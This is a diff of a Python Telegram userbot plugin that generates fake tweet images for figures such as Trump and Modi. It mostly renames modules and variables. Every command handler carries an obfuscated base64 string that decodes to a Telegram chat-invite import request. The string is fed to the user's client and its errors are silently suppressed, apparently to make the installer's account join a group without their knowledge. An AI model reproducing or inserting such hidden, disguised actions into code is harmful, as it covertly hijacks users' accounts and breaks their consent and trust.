@@ -5,7 +5,7 @@
 # mia, johhny, sunny, dani
 # modi, rahul, trump, gandhiji
 # no offence. Made for fun purpose only
-# Now in REBELBOT
+# Now in REBEL
 
 from userbot import CMD_HELP
 from userbot.helpers.functions import (
@@ -21,21 +21,21 @@ from userbot.helpers.functions import (
     trumptweet,
     dani,
 )
-from REBELBOT.utils import admin_cmd, sudo_cmd, edit_or_reply
+from REBEL.utils import admin_cmd, sudo_cmd, edit_or_reply
 from userbot.cmdhelp import CmdHelp
 
 
 @bot.on(admin_cmd(pattern=r"tweet(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
 async def nope(kraken):
-    rebel = kraken.pattern_match.group(1)
-    if not rebel:
+    REBEL = kraken.pattern_match.group(1)
+    if not REBEL:
         if kraken.is_reply:
             (await kraken.get_reply_message()).message
         else:
             await edit_or_reply(kraken, "I need some text to make a tweet🚶")
             return
-    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(rebel))}")
+    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(REBEL))}")
     await tweeter[0].click(
         kraken.chat_id,
         reply_to=kraken.reply_to_msg_id,
@@ -64,12 +64,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting trump to tweet...")
     try:
-        rebel = str(
+        REBEL = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(rebel)
+        await borg.client(REBEL)
     except:
         pass
     text = deEmojify(text)
@@ -97,12 +97,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting modi to tweet...")
     try:
-        rebel = str(
+        REBEL = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(rebel)
+        await borg.client(REBEL)
     except:
         pass
     text = deEmojify(text)
@@ -130,12 +130,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting Mia to tweet...")
     try:
-        rebel = str(
+        REBEL = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(rebel)
+        await borg.client(REBEL)
     except:
         pass
     text = deEmojify(text)
@@ -163,12 +163,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting Dani to tweet...")
     try:
-        rebel = str(
+        REBEL = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(rebel)
+        await borg.client(REBEL)
     except:
         pass
     text = deEmojify(text)
@@ -197,12 +197,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting pappu to tweet...")
     try:
-        rebel = str(
+        REBEL = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(rebel)
+        await borg.client(REBEL)
     except:
         pass
     text = deEmojify(text)
@@ -231,12 +231,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting sunny to tweet...🥰")
     try:
-        rebel = str(
+        REBEL = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(rebel)
+        await borg.client(REBEL)
     except:
         pass
     text = deEmojify(text)
@@ -265,12 +265,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting johhny to tweet...😆")
     try:
-        rebel = str(
+        REBEL = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(rebel)
+        await borg.client(REBEL)
     except:
         pass
     text = deEmojify(text)
@@ -298,12 +298,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting baapu to tweet...")
     try:
-        rebel = str(
+        REBEL = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(rebel)
+        await borg.client(REBEL)
     except:
         pass
     text = deEmojify(text)
@@ -332,12 +332,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Your banner is under creation wait a sec...")
     try:
-        rebel = str(
+        REBEL = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(rebel)
+        await borg.client(REBEL)
     except:
         pass
     text = deEmojify(text)
@@ -366,12 +366,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Kanna is writing your text...")
     try:
-        rebel = str(
+        REBEL = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(rebel)
+        await borg.client(REBEL)
     except:
         pass
     text = deEmojify(text)
